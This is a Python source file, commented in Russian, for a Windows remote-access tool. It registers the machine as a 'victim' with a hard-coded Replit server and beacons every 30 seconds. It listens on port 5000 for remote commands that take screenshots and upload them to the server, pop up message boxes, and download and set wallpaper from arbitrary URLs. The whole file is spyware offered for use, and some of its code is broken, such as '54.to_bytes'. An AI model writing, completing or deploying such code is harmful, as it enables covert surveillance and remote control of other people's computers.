import requests
import socket
import os
import ctypes
import ctypes.wintypes
import threading
import urllib.request
from flask import Flask, request, jsonify

# Твой Replit сервер
SERVER_URL = "https://7dc85eef-cdc8-4640-8f1b-cd02f67448b6-00-3bfkgm7opd68b.spock.replit.dev"

victim_id = socket.gethostname()
callback_url = f"{SERVER_URL}/command"

# Регистрация
def register():
    payload = {
        "id": victim_id,
        "hostname": socket.gethostname(),
        "callback_url": callback_url
    }
    try:
        requests.post(f"{SERVER_URL}/", json=payload, timeout=5)
    except:
        pass

# WinAPI скриншот без PIL
def screenshot():
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    hdc = user32.GetDC(0)
    width = user32.GetSystemMetrics(0)
    height = user32.GetSystemMetrics(1)
    hcdc = gdi32.CreateCompatibleDC(hdc)
    hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
    gdi32.SelectObject(hcdc, hbitmap)
    gdi32.BitBlt(hcdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY

    # Сохраняем в BMP
    BMI = ctypes.c_buffer(40)  # BITMAPINFOHEADER
    ctypes.memset(BMI, 0, 40)
    ctypes.structure = ctypes.Structure
    BMI[:4] = ctypes.sizeof(ctypes.c_void_p).to_bytes(4, 'little')  # biSize
    ctypes.memmove(ctypes.addressof(BMI) + 4, ctypes.byref(ctypes.c_int(width)), 4)
    ctypes.memmove(ctypes.addressof(BMI) + 8, ctypes.byref(ctypes.c_int(height)), 4)
    ctypes.memmove(ctypes.addressof(BMI) + 12, ctypes.byref(ctypes.c_short(1)), 2)   # biPlanes
    ctypes.memmove(ctypes.addressof(BMI) + 14, ctypes.byref(ctypes.c_short(32)), 2)   # biBitCount
    ctypes.memmove(ctypes.addressof(BMI) + 16, ctypes.byref(ctypes.c_int(0)), 4)      # biCompression BI_RGB

    bits = ctypes.create_string_buffer(width * height * 4)
    gdi32.GetDIBits(hcdc, hbitmap, 0, height, bits, BMI, 0)  # DIB_RGB_COLORS

    # BMP заголовок
    file_header = b'BM' + (54 + len(bits)).to_bytes(4, 'little') + b'\x00\x00\x00\x00' + 54.to_bytes(4, 'little')
    info_header = BMI.raw

    bmp_data = file_header + info_header + bits.raw

    path = os.path.join(os.getenv('TEMP'), 'screen.bmp')
    with open(path, 'wb') as f:
        f.write(bmp_data)

    # Отправляем файл
    try:
        with open(path, 'rb') as f:
            files = {'file': ('screen.bmp', f, 'image/bmp')}
            data = {'id': victim_id, 'command': 'screenshot'}
            requests.post(f"{SERVER_URL}/command", data=data, files=files, timeout=10)
    except:
        pass
    finally:
        try:
            os.remove(path)
        except:
            pass

    # Очистка
    gdi32.DeleteObject(hbitmap)
    gdi32.DeleteDC(hcdc)
    user32.ReleaseDC(0, hdc)

def msgbox(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Сообщение", 1)

def set_wallpaper(url):
    path = os.path.join(os.getenv('TEMP'), 'wall.jpg')
    try:
        urllib.request.urlretrieve(url, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

# Flask для приёма команд
app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_command():
    data = request.json
    cmd = data.get('command')
    args = data.get('args', {})

    if cmd == "screenshot":
        threading.Thread(target=screenshot).start()
    elif cmd == "msgbox":
        threading.Thread(target=lambda: msgbox(args.get('text', 'Hello'))).start()
    elif cmd == "setwallpaper":
        threading.Thread(target=lambda: set_wallpaper(args.get('url'))).start()

    return "ok"

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

if __name__ == '__main__':
    register()
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Периодический пинг, чтоб сервер знал, что живы
    while True:
        try:
            requests.post(f"{SERVER_URL}/", json={"id": victim_id}, timeout=5)
        except:
            pass
        threading.Event().wait(30)